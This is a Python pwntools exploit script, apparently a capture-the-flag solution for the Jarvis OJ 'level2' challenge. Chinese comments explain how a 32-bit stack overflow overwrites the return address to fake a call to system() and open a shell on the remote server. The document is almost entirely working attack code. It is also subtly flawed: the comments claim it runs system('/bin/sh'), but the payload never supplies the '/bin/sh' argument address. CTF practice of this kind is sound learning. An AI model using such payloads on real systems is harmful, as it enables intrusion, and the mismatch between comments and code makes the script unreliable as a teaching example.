from pwn import *

junk = "A" * (0x88+4)
address = p32(0x8048320) # system() 函数的地址
junk2 = "\x00" * 4

payload = junk + address + junk2
# 这四个字节是 system() 的返回地址 , 
# 其实这里我们是利用栈溢出模拟了一个函数调用的过程
# 在正常函数调用的时候 , x86-32位 架构下 , 首先对函数的参数压栈(从右至左)
# 然后将函数的返回地址压栈 , 最后程序跳转到函数的第一条指令进行执行
# 这里我们就是模拟了这里过程
# 也就是说执行完 system("/bin/sh") 之后 , 
# CPU 会从栈上取出这里的值并设置 eip 为这个值 , 
# 由于我们这里的目的只是单纯拿到 shell , 
# 因此我们并不需要去理会 system 执行完后程序会如何执行
# 如果做的更完美一点的话 , 可以将其设置为 exit() 函数的地址 , 这样程序就会执行 exit 函数
# 也就是从栈上再取出 exit 函数的参数 , 然后退出
# 或者将其设置为 _start 函数的地址 , 这样就相当于将程序重新运行了一遍

#Io = process("./level2")
Io = remote("pwn2.jarvisoj.com", 9878)
Io.write(payload)
Io.interactive()
